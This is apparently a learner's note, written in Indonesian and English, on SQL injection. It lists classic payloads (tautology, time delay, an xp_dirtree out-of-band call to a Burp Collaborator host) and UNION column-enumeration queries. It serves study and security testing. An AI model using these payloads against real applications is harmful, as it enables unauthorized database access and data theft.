# SQL Injection

## Resource
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Tips
- Tidak semua payload biasa dijalankan di address-bar browser, kadang harus menggunakan burpsuite (repeater)

## Comment
![image](https://user-images.githubusercontent.com/52058660/146121986-00960851-1a8e-4f32-8543-c980b75c6c24.png)

## Payload
```
'
' OR 1=1--
ASCII(97)
'; waitfor delay ('0:00:20')--
exec master..xp_dirtree'//asdfdagffdshsdfgadfgadfgaf.burpcollaborator.net/a'
```

## UNION Attack
Syarat:
  - The individual queries must return the same number of columns.
  - The data types in each column must be compatible between the individual queries.

Untuk melancarkan UNION attack harus memenuhi 2 syarat diatas. Dari syarat2 diatas timbullah pertanyaan:
  - How many columns are being returned from the original query?
  ```
  'UNION SELECT NULL,NULL,n--, dimana n adalah jumlah kolom
  'ORDER BY 1/2/n--, dimana n adalah jumlah kolom
  ```
  - Which columns returned from the original query are of a suitable data type to hold the results from the injected query?


